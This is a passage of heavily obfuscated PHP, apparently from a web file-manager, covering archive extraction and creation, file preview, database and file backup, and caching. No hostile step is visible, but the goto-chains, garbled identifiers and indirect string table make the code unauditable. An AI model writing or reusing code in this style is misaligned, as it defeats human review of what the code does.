(!is_array($aäÜğÍí²â)) { return !1; } goto Cà…¹ç¢; b·˜¾áçËÊ: } static function extractZipFile($bÜŠÙƒ‹Ú, $bà‚–î¾Ö, $fŠ¿Æã¬®Ô = false) { goto EóË¯Õ½ò¥; e†¨ºé‚”: if (!file_exists($c¢¼ÛŒÌÙì)) { return !1; } @rename($c¢¼ÛŒÌÙì, $aëÏ½Á÷ä); return $aëÏ½Á÷ä; goto CÌ‘ÍÀ¿Ô›; EóË¯Õ½ò¥: $AÓ‰¿óğ‚´ =& $_SERVER[ÍÓÖ€°å]; self::init(); $cÓŒì»òî£ = TEMP_FILES . hash_path($bÜŠÙƒ‹Ú) . $AÓ‰¿óğ‚´[8]; goto a«‹òÆ¨‚; e©Ö íî­‰: if (file_exists($aëÏ½Á÷ä)) { return $aëÏ½Á÷ä; } $C²Õ„ÜÕÏÁ = new PclZip($bÜŠÙƒ‹Ú); $c¢¼ÛŒÌÙì = unzip_filter_ext($cÓŒì»òî£ . get_path_this($bà‚–î¾Ö)); goto DÍ‹‘ç”Ù; a«‹òÆ¨‚: mk_dir($cÓŒì»òî£); $aëÏ½Á÷ä = $cÓŒì»òî£ . md5($bÜŠÙƒ‹Ú . $bà‚–î¾Ö); if ($fŠ¿Æã¬®Ô) { $aëÏ½Á÷ä = $cÓŒì»òî£ . $fŠ¿Æã¬®Ô; } goto e©Ö íî­‰; DÍ‹‘ç”Ù: $F¡‘³ƒ¦Æß = get_path_father($bà‚–î¾Ö); if ($F¡‘³ƒ¦Æß == $bà‚–î¾Ö) { $F¡‘³ƒ¦Æß = $AÓ‰¿óğ‚´[33]; } $FŒõ°¥ù» = $C²Õ„ÜÕÏÁ->extract(PCLZIP_OPT_PATH, $cÓŒì»òî£, PCLZIP_CB_PRE_FILE_NAME, $AÓ‰¿óğ‚´[1290], PCLZIP_OPT_REMOVE_PATH, $F¡‘³ƒ¦Æß, PCLZIP_OPT_BY_NAME, $bà‚–î¾Ö); goto e†¨ºé‚”; CÌ‘ÍÀ¿Ô›: } static function filePreview($FÍÙÓÏÜ‡, $dˆƒ“ §Åñ, $fÕªîøÒˆ  = false, $B‘‹ßÀ†¨ = false) { goto c¿ë‘ƒ¹ùƒ; CçÄº“›: mk_dir($FĞå¨ÊÈ); $b˜¦Ü¦É¦ö = $FĞå¨ÊÈ . md5($FÍÙÓÏÜ‡ . $dˆƒ“ §Åñ . $B‘‹ßÀ†¨); $bçòÂÏ’² = $FŸÌ¡ƒ‘Œ[33]; goto A’ãíé„ì; CÅìÚí›Õ¥: if (!file_exists($b˜¦Ü¦É¦ö)) { del_dir($FĞå¨ÊÈ); show_json($FŸÌ¡ƒ‘Œ[1295]); } IO::fileOut($b˜¦Ü¦É¦ö, $fÕªîøÒˆ , $Bèƒ˜´Š); goto cÄÈ‹©É‡; B«§«ñÆã¢: if (!$AğÈŞãƒÍ×[$FŸÌ¡ƒ‘Œ[757]]) { show_json($AğÈŞãƒÍ×[$FŸÌ¡ƒ‘Œ[759]], !1); } if (!file_exists($Eğ¼¾òëÛ)) { show_json($FŸÌ¡ƒ‘Œ[1294], !1); } @rename($Eğ¼¾òëÛ, $b˜¦Ü¦É¦ö); goto CÅìÚí›Õ¥; e®ËÆ«Ò‹¸: $bçòÂÏ’² = unzip_pre_name($bçòÂÏ’²); $Bèƒ˜´Š = get_path_this($bçòÂÏ’²); $Eğ¼¾òëÛ = unzip_filter_ext($FĞå¨ÊÈ . $Bèƒ˜´Š); goto B«§«ñÆã¢; A’ãíé„ì: $AğÈŞãƒÍ× = self::extract($FÍÙÓÏÜ‡, $FĞå¨ÊÈ, $dˆƒ“ §Åñ, $bçòÂÏ’²); if (is_array($bçòÂÏ’²)) { show_json($FŸÌ¡ƒ‘Œ[1293], !1); } if (file_exists($b˜¦Ü¦É¦ö)) { IO::fileOut($b˜¦Ü¦É¦ö, $fÕªîøÒˆ , get_path_this($bçòÂÏ’²)); return; } goto e®ËÆ«Ò‹¸; c¿ë‘ƒ¹ùƒ: $FŸÌ¡ƒ‘Œ =& $_SERVER[ÍÓÖ€°å]; self::init(); $FĞå¨ÊÈ = TEMP_FILES . hash_path($FÍÙÓÏÜ‡) . $FŸÌ¡ƒ‘Œ[8]; goto CçÄº“›; cÄÈ‹©É‡: } static function create($A·Ì½»‚µ, $AĞÖ‰‡êí) { $Aé±¤èÌŒ– =& $_SERVER[ÍÓÖ€°å]; self::init(); $AŸƒì©£•ˆ = get_path_ext($A·Ì½»‚µ); $A¥å³¸ø„ñ = !1; if (self::checkIfType($AŸƒì©£•ˆ, $Aé±¤èÌŒ–[293])) { if (kodZipArchive::support($Aé±¤èÌŒ–[739])) { return kodZipArchive::create($A·Ì½»‚µ, $AĞÖ‰‡êí); } $aÁ‘òçÆÛ‹ = new PclZip($A·Ì½»‚µ); foreach ($AĞÖ‰‡êí as $E—Œ¬œ¥ô™ => $C³Ãà³‡ÃĞ) { $C³Ãà³‡ÃĞ = str_replace($Aé±¤èÌŒ–[1296], $Aé±¤èÌŒ–[8], $C³Ãà³‡ÃĞ); $cÅÖÍß¶¥Š = Kodio::clear(get_path_father($C³Ãà³‡ÃĞ)); if ($E—Œ¬œ¥ô™ == 0) { $A¥å³¸ø„ñ = $aÁ‘òçÆÛ‹->create($C³Ãà³‡ÃĞ, PCLZIP_OPT_REMOVE_PATH, $cÅÖÍß¶¥Š, PCLZIP_CB_PRE_FILE_NAME, $Aé±¤èÌŒ–[1297]); continue; } $A¥å³¸ø„ñ = $aÁ‘òçÆÛ‹->add($C³Ãà³‡ÃĞ, PCLZIP_OPT_REMOVE_PATH, $cÅÖÍß¶¥Š, PCLZIP_CB_PRE_FILE_NAME, $Aé±¤èÌŒ–[1297]); } } else { if (self::checkIfType($AŸƒì©£•ˆ, $Aé±¤èÌŒ–[1265])) { foreach ($AĞÖ‰‡êí as $E—Œ¬œ¥ô™ => $C³Ãà³‡ÃĞ) { $C³Ãà³‡ÃĞ = str_replace($Aé±¤èÌŒ–[1296], $Aé±¤èÌŒ–[8], $C³Ãà³‡ÃĞ); $cÅÖÍß¶¥Š = Kodio::clear(get_path_father($C³Ãà³‡ÃĞ)); if ($E—Œ¬œ¥ô™ == 0) { $A¥å³¸ø„ñ = PclTarCreate($A·Ì½»‚µ, array($C³Ãà³‡ÃĞ), $AŸƒì©£•ˆ, null, $cÅÖÍß¶¥Š); continue; } $A¥å³¸ø„ñ = PclTarAddList($A·Ì½»‚µ, array($C³Ãà³‡ÃĞ), $Aé±¤èÌŒ–[33], $cÅÖÍß¶¥Š, $AŸƒì©£•ˆ); } } } return $A¥å³¸ø„ñ; } } goto CËÖó´¼†; e„Ÿ©©éÛì: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto AØ›Â…Õêø; CŸéÛ†‰×: $Bİ¯Êç§ğ¯ = TEMP_FILES . $B´Ÿ‚ò˜ä‚[466] . self::$name . $B´Ÿ‚ò˜ä‚[8]; del_dir($Bİ¯Êç§ğ¯); mk_dir($Bİ¯Êç§ğ¯); goto A¿…Ê³¡­Ü; A¿…Ê³¡­Ü: foreach ($cêå˜§£ã³ as $DÃŸ’ÆÅŠì) { $AÆ–ƒç³ùŒ = "{$Bİ¯Êç§ğ¯}{$DÃŸ’ÆÅŠì}\56\163\x71\x6c"; $C„´å¾¸ò„ += $this->makeSqlFile($DÃŸ’ÆÅŠì, $AÆ–ƒç³ùŒ, $F°‹Šëä¹‘, $D£…„»ôò¾); } $F°‹Šëä¹‘->end(); $e·®¬¨çº = array($B´Ÿ‚ò˜ä‚[455] => 1, $B´Ÿ‚ò˜ä‚[467] => $C„´å¾¸ò„); goto CãÇ‚˜­ò; c——ÒÂ¶ÙÏ: self::$name = $D£…„»ôò¾[$B´Ÿ‚ò˜ä‚[28]]; if ($C£Ä†•¨ò = $this->sqliteFile()) { return $this->sqliteBackup($C£Ä†•¨ò); } $BÊğ„¶–ò– = 0; goto DÁ‹„¸¶¨­; AØ›Â…Õêø: $B´Ÿ‚ò˜ä‚ =& $_SERVER[ÍÓÖ€°å]; $D£…„»ôò¾ = Backup::get(); self::$io = $D£…„»ôò¾[$B´Ÿ‚ò˜ä‚[439]]; goto c——ÒÂ¶ÙÏ; F˜›çĞ¶‡ˆ: $e·®¬¨çº = array($B´Ÿ‚ò˜ä‚[463] => $B´Ÿ‚ò˜ä‚[464], $B´Ÿ‚ò˜ä‚[465] => $BÊğ„¶–ò– + 1); Backup::set($e·®¬¨çº); $C„´å¾¸ò„ = 0; goto CŸéÛ†‰×; DÁ‹„¸¶¨­: $cêå˜§£ã³ = Model()->db()->getTables(); foreach ($cêå˜§£ã³ as $DÃŸ’ÆÅŠì) { $BÊğ„¶–ò– += Model($DÃŸ’ÆÅŠì)->count(); } $F°‹Šëä¹‘ = new Task($B´Ÿ‚ò˜ä‚[458], $B´Ÿ‚ò˜ä‚[459], $BÊğ„¶–ò–, LNG($B´Ÿ‚ò˜ä‚[460]) . $B´Ÿ‚ò˜ä‚[461] . LNG($B´Ÿ‚ò˜ä‚[462])); goto F˜›çĞ¶‡ˆ; CãÇ‚˜­ò: Backup::set($e·®¬¨çº); return !0; goto A™ÊÏáŠ’â; A™ÊÏáŠ’â: } public function makeSqlFile($dêŠŒù¹íø, $DÊ»ÚÕ°Œ, $AÉùƒ£ ï, $eÅ¹¥Œ÷åø) { goto A½»àÚ÷ˆ; c’Í‘ õšÊ: $B­õíÎœºÅ = Model($dêŠŒù¹íø)->getDbFields(); do { $Càƒ÷Ÿ‚Øã = Model($dêŠŒù¹íø)->field($B­õíÎœºÅ)->order($DÌ”Îâ‡ º . $_SERVER[ÍÓÖ€°å][469])->selectPage($eä¥èĞÆÒ÷, $CÂëì…ô„æ); $E£ÔÉÁƒÓ = !empty($Càƒ÷Ÿ‚Øã[$_SERVER[ÍÓÖ€°å][345]]) ? $Càƒ÷Ÿ‚Øã[$_SERVER[ÍÓÖ€°å][345]] : array(); $AÎÉÃÌ§ƒ = array(); foreach ($E£ÔÉÁƒÓ as $aÖ—Ğ´”É¬) { if ($dêŠŒù¹íø == $_SERVER[ÍÓÖ€°å][470] && (!isset($eÅ¹¥Œ÷åø[$_SERVER[ÍÓÖ€°å][440]]) || $eÅ¹¥Œ÷åø[$_SERVER[ÍÓÖ€°å][440]] == $_SERVER[ÍÓÖ€°å][393])) { $aÖ—Ğ´”É¬[$_SERVER[ÍÓÖ€°å][76]] = str_replace("\173\151\157\x3a{$aÖ—Ğ´”É¬[$_SERVER[ÍÓÖ€°å][471]]}\x7d", "\x7b\151\157\x3a{$cš‡äà»³•}\175", $aÖ—Ğ´”É¬[$_SERVER[ÍÓÖ€°å][76]]); $aÖ—Ğ´”É¬[$_SERVER[ÍÓÖ€°å][471]] = $cš‡äà»³•; } $AÎÉÃÌ§ƒ[] = $_SERVER[ÍÓÖ€°å][472] . $this->addSqlSlashes($aÖ—Ğ´”É¬) . $_SERVER[ÍÓÖ€°å][473]; } if ($C©¡â‘•ÁÜ = count($E£ÔÉÁƒÓ)) { $C»¸è¿Ñ¸ò = "\111\x4e\123\105\122\124\40\111\116\x54\117\x20\140{$dêŠŒù¹íø}\x60\40\50\140" . implode($_SERVER[ÍÓÖ€°å][474], $B­õíÎœºÅ) . $_SERVER[ÍÓÖ€°å][475]; fwrite($Dï¸“ƒ³ƒ, $C»¸è¿Ñ¸ò . implode($_SERVER[ÍÓÖ€°å][476], $AÎÉÃÌ§ƒ) . $_SERVER[ÍÓÖ€°å][68] . PHP_EOL); $AÉùƒ£ ï->update($C©¡â‘•ÁÜ); } $CÂëì…ô„æ++; $A ÀšºÄğ¡ += $C©¡â‘•ÁÜ; } while ($C©¡â‘•ÁÜ == $eä¥èĞÆÒ÷); fclose($Dï¸“ƒ³ƒ); goto C…ò«Ó«ˆÚ; C…ò«Ó«ˆÚ: return $A ÀšºÄğ¡; goto AŞ÷§ÆÄœÛ; A½»àÚ÷ˆ: $cš‡äà»³• = self::$io; $A ÀšºÄğ¡ = 0; $CÂëì…ô„æ = 1; goto FÇÆÇŸáæ‡; FÇÆÇŸáæ‡: $eä¥èĞÆÒ÷ = 2000; $Dï¸“ƒ³ƒ = fopen($DÊ»ÚÕ°Œ, $_SERVER[ÍÓÖ€°å][468]); $DÌ”Îâ‡ º = Model($dêŠŒù¹íø)->getPk(); goto c’Í‘ õšÊ; AŞ÷§ÆÄœÛ: } private function addSqlSlashes($DÀ…¯¥Ò‰) { $Aš«¬¤ÏÉÔ =& $_SERVER[ÍÓÖ€°å]; $FÉ¯Ó±ñò¤ = array(); foreach ($DÀ…¯¥Ò‰ as $e„Àç•™“) { if (is_array($e„Àç•™“)) { $e„Àç•™“ = json_encode_force($e„Àç•™“); } $e„Àç•™“ = addslashes($e„Àç•™“); $e„Àç•™“ = str_replace(array($Aš«¬¤ÏÉÔ[477], $Aš«¬¤ÏÉÔ[212]), array($Aš«¬¤ÏÉÔ[478], $Aš«¬¤ÏÉÔ[479]), $e„Àç•™“); $FÉ¯Ó±ñò¤[] = $e„Àç•™“; } return $Aš«¬¤ÏÉÔ[55] . implode($Aš«¬¤ÏÉÔ[480], $FÉ¯Ó±ñò¤) . $Aš«¬¤ÏÉÔ[55]; } private function sqliteFile() { $ağ«Š×ºé =& $_SERVER[ÍÓÖ€°å]; $b†™¯“¤Îã = null; $a¥š„Ü‡ = $GLOBALS[$ağ«Š×ºé[6]][$ağ«Š×ºé[17]]; if ($a¥š„Ü‡[$ağ«Š×ºé[481]] == $ağ«Š×ºé[482]) { $C…£æÒğ¬  = explode($ağ«Š×ºé[483], $a¥š„Ü‡[$ağ«Š×ºé[484]]); if (substr($C…£æÒğ¬ [0], 0, 6) == $ağ«Š×ºé[9]) { $b†™¯“¤Îã = $C…£æÒğ¬ [1]; } } else { if (substr($a¥š„Ü‡[$ağ«Š×ºé[481]], 0, 6) == $ağ«Š×ºé[9]) { $b†™¯“¤Îã = $a¥š„Ü‡[$ağ«Š×ºé[226]]; } } return $b†™¯“¤Îã; } public function sqliteBackup($FˆÑ‡İ¶Á‚) { goto eèè‘Õò¡Û; d»¨Üä›Æø: $Bª­ê’à¯ = "\x7b\151\157\72{$DöêãÁÑ½}\x7d\x2f\144\141\x74\x61\142\141\163\145\x2f\142\141\143\x6b\x75\x70\137" . self::$name . $aƒæàÔÁª¨[486]; if (!IO::exist($Bª­ê’à¯)) { IO::mkdir($Bª­ê’à¯); } $Eèæ®“éâ = IO::size($FˆÑ‡İ¶Á‚); goto DÍóó›’ÜŠ; b‚‚Õõ»–: $Bâµ©‡ƒëÁ->end(); $dèğ»ùïÅõ = array($aƒæàÔÁª¨[455] => 1, $aƒæàÔÁª¨[467] => 1, $aƒæàÔÁª¨[456] => 1, $aƒæàÔÁª¨[492] => $Eèæ®“éâ); Backup::set($dèğ»ùïÅõ); goto D½ËÀ¤Öç; DÍóó›’ÜŠ: $dèğ»ùïÅõ = array($aƒæàÔÁª¨[463] => $aƒæàÔÁª¨[9], $aƒæàÔÁª¨[465] => 1, $aƒæàÔÁª¨[487] => $Eèæ®“éâ); Backup::set($dèğ»ùïÅõ); $Bâµ©‡ƒëÁ = new TaskFileTransfer($aƒæàÔÁª¨[488], $aƒæàÔÁª¨[459], 1, LNG($aƒæàÔÁª¨[460]) . $aƒæàÔÁª¨[489] . LNG($aƒæàÔÁª¨[462]) . $aƒæàÔÁª¨[490]); goto f¼ÑÇÜö²; D½ËÀ¤Öç: return !1; goto bôÏë‰; eèè‘Õò¡Û: $aƒæàÔÁª¨ =& $_SERVER[ÍÓÖ€°å]; $DöêãÁÑ½ = self::$io; $a«Ñ„ÛÍ¢Ş = CONTROLLER_DIR . $aƒæàÔÁª¨[485]; goto d»¨Üä›Æø; f¼ÑÇÜö²: $Bâµ©‡ƒëÁ->task[$aƒæàÔÁª¨[446]] = $Eèæ®“éâ; IO::copy($a«Ñ„ÛÍ¢Ş . $aƒæàÔÁª¨[491], $Bª­ê’à¯); IO::copy($FˆÑ‡İ¶Á‚, $Bª­ê’à¯); goto b‚‚Õõ»–; bôÏë‰: } } class BackupDbFile { public function __construct() { } public function index() { goto aİÑ¡òµ”“; Eå÷›˜í®: $Ağ¨ˆ°½Øã = TEMP_FILES . "\142\141\x63\153\x75\160\x5f{$dô“•ŒÛ®•}\57"; $Cµ˜…ÖÄË = "\x7b\151\157\72{$fÍÒåæ‚ø[$B¨¨ëÜ¤æ[439]]}\x7d\x2f\144\141\x74\x61\142\141\x73\145\57"; IO::mkdir($Cµ˜…ÖÄË . "\142\x61\143\x6b\x75\x70\x5f{$dô“•ŒÛ®•}\x2f"); goto aáÛØ‘÷”ñ; aáÛØ‘÷”ñ: $BÎÍí¬¤‚ = new TaskFileTransfer($B¨¨ëÜ¤æ[488], $B¨¨ëÜ¤æ[459], 0, LNG($B¨¨ëÜ¤æ[460]) . $B¨¨ëÜ¤æ[489] . LNG($B¨¨ëÜ¤æ[462]) . $B¨¨ëÜ¤æ[490]); $BÎÍí¬¤‚->addPath($Ağ¨ˆ°½Øã); $c²ĞíŞÒç = IO::infoWithChildren($Ağ¨ˆ°½Øã); goto DàÚù–©; dáÖ†÷çºó: return !0; goto AØÂñ¬Õ¨; DàÚù–©: Backup::set(array($B¨¨ëÜ¤æ[487] => $c²ĞíŞÒç[$B¨¨ëÜ¤æ[78]])); IO::move($Ağ¨ˆ°½Øã, $Cµ˜…ÖÄË); $cÙ‰ì­Š÷ª = CONTROLLER_DIR . $B¨¨ëÜ¤æ[493]; goto B„ ¬õ÷º—; B„ ¬õ÷º—: IO::copy($cÙ‰ì­Š÷ª, $Cµ˜…ÖÄË . "\142\x61\x63\153\x75\x70\x5f{$dô“•ŒÛ®•}\x2f"); $BÎÍí¬¤‚->end(); Backup::set(array($B¨¨ëÜ¤æ[492] => $c²ĞíŞÒç[$B¨¨ëÜ¤æ[78]])); goto dáÖ†÷çºó; aİÑ¡òµ”“: $B¨¨ëÜ¤æ =& $_SERVER[ÍÓÖ€°å]; $fÍÒåæ‚ø = Backup::get(); $dô“•ŒÛ®• = $fÍÒåæ‚ø[$B¨¨ëÜ¤æ[28]]; goto Eå÷›˜í®; AØÂñ¬Õ¨: } } class BackupFile { public function __construct() { } public function index() { goto fİğ¹­ê ; BÕÕ‰å¨‘Ü: $f¯¬íé´ÙÛ->end(); $dÊÆ„œ–‘Ô = array($_SERVER[ÍÓÖ€°å][510] => 1, $_SERVER[ÍÓÖ€°å][451] => time(), $_SERVER[ÍÓÖ€°å][457] => 1, $_SERVER[ÍÓÖ€°å][507] => $fÇî‘¦é´’, $_SERVER[ÍÓÖ€°å][499] => $Açè§ÖšœÄ, $_SERVER[ÍÓÖ€°å][498] => $cÜêØ±¦‰·); if ($e±Á¤•×¬) { $dÊÆ„œ–‘Ô[$_SERVER[ÍÓÖ€°å][508]] = $Cê®ÔÁñæ•; $dÊÆ„œ–‘Ô[$_SERVER[ÍÓÖ€°å][509]] = $A›öíö²´Ô; } goto Fâáµ°µĞ°; Fâáµ°µĞ°: Backup::set($dÊÆ„œ–‘Ô); $this->_fileFilter($b˜›ùÇÁŒ×); return !0; goto Cùã’½ÑÂ‚; fİğ¹­ê : $F«µŞ›İÕ‚ = Backup::get(); $fÇî‘¦é´’ = $F«µŞ›İÕ‚[$_SERVER[ÍÓÖ€°å][273]][$_SERVER[ÍÓÖ€°å][155]][$_SERVER[ÍÓÖ€°å][373]]; $Aìì‘¬‡ö³ = array($_SERVER[ÍÓÖ€°å][381] => array($_SERVER[ÍÓÖ€°å][494], $fÇî‘¦é´’), $_SERVER[ÍÓÖ€°å][495] => array($_SERVER[ÍÓÖ€°å][311], $F«µŞ›İÕ‚[$_SERVER[ÍÓÖ€°å][439]])); goto cİç„µ×Ö‘; b¹¹ÁÔÁ”¡: $b˜›ùÇÁŒ× = array(); $A›öíö²´Ô = $Cê®ÔÁñæ• = 0; do { $B§í¡õæöæ = $_SERVER[ÍÓÖ€°å][500]; $cß°°®ïš† = Model($_SERVER[ÍÓÖ€°å][470])->where($Aìì‘¬‡ö³)->field($B§í¡õæöæ)->order($_SERVER[ÍÓÖ€°å][501])->selectPage($d•­Î¦±„¹, $F Â‘¯óë¨); $FøÈøâ¤ÆÚ = !empty($cß°°®ïš†[$_SERVER[ÍÓÖ€°å][345]]) ? $cß°°®ïš†[$_SERVER[ÍÓÖ€°å][345]] : array(); foreach ($FøÈøâ¤ÆÚ as $c¢Ğ³Ê¬Ä‹) { goto f¶‚¦İ¢¾Ô; BŞÄíŒëë¯: if ($cŒ‹ŠŞÓÚ >= 1024 * 1024 * 50) { $dÊÆ„œ–‘Ô = array($_SERVER[ÍÓÖ€°å][507] => $fÇî‘¦é´’, $_SERVER[ÍÓÖ€°å][508] => $Cê®ÔÁñæ•, $_SERVER[ÍÓÖ€°å][509] => $A›öíö²´Ô); Backup::set($dÊÆ„œ–‘Ô); $cŒ‹ŠŞÓÚ = $e±Á¤•×¬ = 0; } goto CƒÎÜ÷ëç ; f¶‚¦İ¢¾Ô: if (!$this->_fileExist($c¢Ğ³Ê¬Ä‹, $b˜›ùÇÁŒ×)) { $cÜêØ±¦‰· -= 1; $Açè§ÖšœÄ -= (int) $c¢Ğ³Ê¬Ä‹[$_SERVER[ÍÓÖ€°å][78]]; write_log("\x66\151\x6c\145\x20\x6e\157\164\x20\145\170\151\x73\164\56\146\x69\154\x65\x49\x44\x3a{$c¢Ğ³Ê¬Ä‹[$_SERVER[ÍÓÖ€°å][373]]}\54\x20\x70\141\164\x68\x3a{$c¢Ğ³Ê¬Ä‹[$_SERVER[ÍÓÖ€°å][76]]}", $_SERVER[ÍÓÖ€°å][502]); continue; } $FšÛ ­í±ê = $c¢Ğ³Ê¬Ä‹[$_SERVER[ÍÓÖ€°å][76]]; $C•‘àê‚©Æ = str_replace("\173\151\x6f\72{$c¢Ğ³Ê¬Ä‹[$_SERVER[ÍÓÖ€°å][471]]}\x7d", "\x7b\151\157\x3a{$F«µŞ›İÕ‚[$_SERVER[ÍÓÖ€°å][439]]}\175", $FšÛ ­í±ê); goto e›²µŠé‚ù; e›²µŠé‚ù: if (IO::exist($C•‘àê‚©Æ)) { $f¯¬íé´ÙÛ->updateFileEnd($c¢Ğ³Ê¬Ä‹[$_SERVER[ÍÓÖ€°å][28]], $c¢Ğ³Ê¬Ä‹[$_SERVER[ÍÓÖ€°å][78]]); } else { if (!IO::copy($FšÛ ­í±ê, $C•‘àê‚©Æ, $_SERVER[ÍÓÖ€°å][503])) { write_log($_SERVER[ÍÓÖ€°å][504] . $FšÛ ­í±ê . $_SERVER[ÍÓÖ€°å][505] . $C•‘àê‚©Æ . $_SERVER[ÍÓÖ€°å][506] . $c¢Ğ³Ê¬Ä‹[$_SERVER[ÍÓÖ€°å][28]], $_SERVER[ÍÓÖ€°å][459]); continue; } } $fÇî‘¦é´’ = $c¢Ğ³Ê¬Ä‹[$_SERVER[ÍÓÖ€°å][373]]; $e±Á¤•×¬ += 1; goto EÕŠßâ¶ƒ†; EÕŠßâ¶ƒ†: $cŒ‹ŠŞÓÚ += $c¢Ğ³Ê¬Ä‹[$_SERVER[ÍÓÖ€°å][78]]; $Cê®ÔÁñæ• += 1; $A›öíö²´Ô += $c¢Ğ³Ê¬Ä‹[$_SERVER[ÍÓÖ€°å][78]]; goto BŞÄíŒëë¯; CƒÎÜ÷ëç : } $B™ºµ±Œ˜¹ = count($FøÈøâ¤ÆÚ); $F Â‘¯óë¨++; } while ($B™ºµ±Œ˜¹ == $d•­Î¦±„¹); goto BÕÕ‰å¨‘Ü; a¥š¯öè¾: $f¯¬íé´ÙÛ->task[$_SERVER[ÍÓÖ€°å][446]] = $Açè§ÖšœÄ; $dÊÆ„œ–‘Ô = array($_SERVER[ÍÓÖ€°å][498] => $cÜêØ±¦‰·, $_SERVER[ÍÓÖ€°å][499] => $Açè§ÖšœÄ); Backup::set($dÊÆ„œ–‘Ô); goto C÷ŠÛ ÖçÖ; C÷ŠÛ ÖçÖ: $F Â‘¯óë¨ = 1; $d•­Î¦±„¹ = 1000; $cŒ‹ŠŞÓÚ = $e±Á¤•×¬ = 0; goto b¹¹ÁÔÁ”¡; cİç„µ×Ö‘: $cÜêØ±¦‰· = (int) Model($_SERVER[ÍÓÖ€°å][470])->where($Aìì‘¬‡ö³)->count($_SERVER[ÍÓÖ€°å][373]); $Açè§ÖšœÄ = (int) Model($_SERVER[ÍÓÖ€°å][470])->where($Aìì‘¬‡ö³)->sum($_SERVER[ÍÓÖ€°å][78]); $f¯¬íé´ÙÛ = new TaskFileTransfer($_SERVER[ÍÓÖ€°å][496], $_SERVER[ÍÓÖ€°å][459], $cÜêØ±¦‰·, LNG($_SERVER[ÍÓÖ€°å][460]) . $_SERVER[ÍÓÖ€°å][461] . LNG($_SERVER[ÍÓÖ€°å][497])); goto a¥š¯öè¾; Cùã’½ÑÂ‚: } private function _fileExist($Dèòí·ò¤, &$fãµáÙÀÇ¢) { goto C°Ïõ†ÑËˆ; dÒ»¬®Øà‘: $D«Ô³‹‚­® = array($DõÍÆŸÇƒ…[471] => $Dèòí·ò¤[$DõÍÆŸÇƒ…[471]], $DõÍÆŸÇƒ…[76] => array($DõÍÆŸÇƒ…[511], "{$F‚‹¾¼Æ½ù}\x25")); $DÛ­´‡á÷´ = Model($DõÍÆŸÇƒ…[470])->where($D«Ô³‹‚­®)->field($DõÍÆŸÇƒ…[381])->select(); $fãµáÙÀÇ¢ = array_merge($fãµáÙÀÇ¢, array_to_keyvalue($DÛ­´‡á÷´, $DõÍÆŸÇƒ…[33], $DõÍÆŸÇƒ…[373])); goto D”†š„£Ùß; D”†š„£Ùß: return !1; goto fïòß³ßĞ¢; f–ù¥è–ÑÂ: if (IO::exist($EÁ¦–õÈâë)) { return !0; } $F‚‹¾¼Æ½ù = get_path_father($EÁ¦–õÈâë); if (IO::exist($F‚‹¾¼Æ½ù)) { $fãµáÙÀÇ¢[] = $Dèòí·ò¤[$DõÍÆŸÇƒ…[373]]; return !1; } goto dÒ»¬®Øà‘; C°Ïõ†ÑËˆ: $DõÍÆŸÇƒ… =& $_SERVER[ÍÓÖ€°å]; $EÁ¦–õÈâë = $Dèòí·ò¤[$DõÍÆŸÇƒ…[76]]; if (in_array($Dèòí·ò¤[$DõÍÆŸÇƒ…[373]], $fãµáÙÀÇ¢)) { return !1; } goto f–ù¥è–ÑÂ; fïòß³ßĞ¢: } private function _fileFilter($bÅ¾‹ôÃâ‘) { $e–ï®öÊ¿ =& $_SERVER[ÍÓÖ€°å]; if (empty($bÅ¾‹ôÃâ‘)) { return; } $báïìÅøŠ = array($e–ï®öÊ¿[373] => array($e–ï®öÊ¿[7], array_unique($bÅ¾‹ôÃâ‘))); $F¿”íÈÈ½ = Model($e–ï®öÊ¿[512])->where($báïìÅøŠ)->field($e–ï®öÊ¿[365])->select(); foreach ($F¿”íÈÈ½ as $e˜¡Í„À¾è) { Model($e–ï®öÊ¿[512])->remove($e˜¡Í„À¾è[$e–ï®öÊ¿[365]], !1); } } } goto EÉ…š–¬ºª; EÉ…š–¬ºª: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto bƒÎ›ÃŞ; bƒÎ›ÃŞ: $C‘íä†š©Š =& $_SERVER[ÍÓÖ€°å]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto cµ‹ë„Ú ƒ; cµ‹ë„Ú ƒ: $b¦‰ÊÛ„ – = $GLOBALS[$C‘íä†š©Š[6]][$C‘íä†š©Š[329]]; $A¤ÈèÛÕÖï = $b¦‰ÊÛ„ –[$b¦‰ÊÛ„ –[$C‘íä†š©Š[513]]]; $BËî…¢“ßß = $b¦‰ÊÛ„ –[$C‘íä†š©Š[514]]; goto bŸŒôšÁ·ˆ; bŸŒôšÁ·ˆ: switch ($b¦‰ÊÛ„ –[$C‘íä†š©Š[513]]) { case $C‘íä†š©Š[17]: self::$handle = Model($C‘íä†š©Š[515]); break; case $C‘íä†š©Š[516]: self::$handle = new CacheRedis($A¤ÈèÛÕÖï, $BËî…¢“ßß); break; case $C‘íä†š©Š[517]: self::$handle = new CacheMemcached($A¤ÈèÛÕÖï, $BËî…¢“ßß); break; case $C‘íä†š©Š[155]: self::$handle = new CacheFile($A¤ÈèÛÕÖï, $BËî…¢“ßß); break; default: break; } return self::$handle; goto F”¾Å‰¯°Ş; F”¾Å‰¯°Ş: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Cƒğİ”ŒÊË) { if (is_array($Cƒğİ”ŒÊË) || is_object($Cƒğİ”ŒÊË)) { $Cƒğİ”ŒÊË = json_encode($Cƒğİ”ŒÊË); } return KOD_SITE_ID . $_SERVER[ÍÓÖ€°å][71] . $Cƒğİ”ŒÊË; } public static function get($CÕÊ±Öæ) { $CÕÊ±Öæ = self::key($CÕÊ±Öæ); if (!isset(self::$memoryCache[$CÕÊ±Öæ])) { CacheLock::lock($CÕÊ±Öæ); $có¬š‹ˆ«˜ = self::init()->get($CÕÊ±Öæ); CacheLock::unlock($CÕÊ±Öæ); self::$memoryCache[$CÕÊ±Öæ] = unserialize($có¬š‹ˆ«˜); } return self::$memoryCache[$CÕÊ±Öæ]; } public static function set($b—³æ¯Ö¦ì, $FÀ»œÆ††, $FåøùÜ°ˆ  = false) { goto Cšó­Â¸ïƒ; B®»Š§è¿ë: CacheLock::lock($b—³æ¯Ö¦ì); $dË½‘­ù›– = self::init()->set($b—³æ¯Ö¦ì, serialize($FÀ»œÆ††), $FåøùÜ°ˆ ); self::$memoryCache[$b—³æ¯Ö¦ì] = $FÀ»œÆ††; goto C ÷®°Óˆ; C ÷®°Óˆ: CacheLock::unlock($b—³æ¯Ö¦ì); return $dË½‘­ù›–; goto bÚÒ³µµº; Cšó­Â¸ïƒ: 